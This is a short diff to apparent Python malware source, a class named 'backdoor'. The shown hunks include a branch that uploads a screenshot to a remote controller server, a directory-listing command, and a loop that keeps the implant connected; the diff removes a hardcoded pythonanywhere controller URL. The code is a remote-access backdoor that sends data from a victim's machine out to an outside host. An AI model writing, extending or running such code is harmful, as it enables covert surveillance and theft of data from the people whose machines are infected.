@@ -96,7 +96,7 @@ class backdoor:
                 sample_file = open("screenshot.png", "rb")
                 upload_file = {"file": sample_file}
                 r = requests.post(f"{self.url}api/files/", files = upload_file)
-                output += f"{self.url}media/files/screenshot.png\n"
+                output += f"\n{self.url}media/files/screenshot.png\n"
             elif command.startswith("ls"):
                 output = ""
                 for i in os.listdir():
@@ -272,7 +272,7 @@ class backdoor:
 
 while True:
     try:
-        backdoor("https://pybdtest.pythonanywhere.com/")
+        backdoor()
     except Exception as e:
         print(e)
         
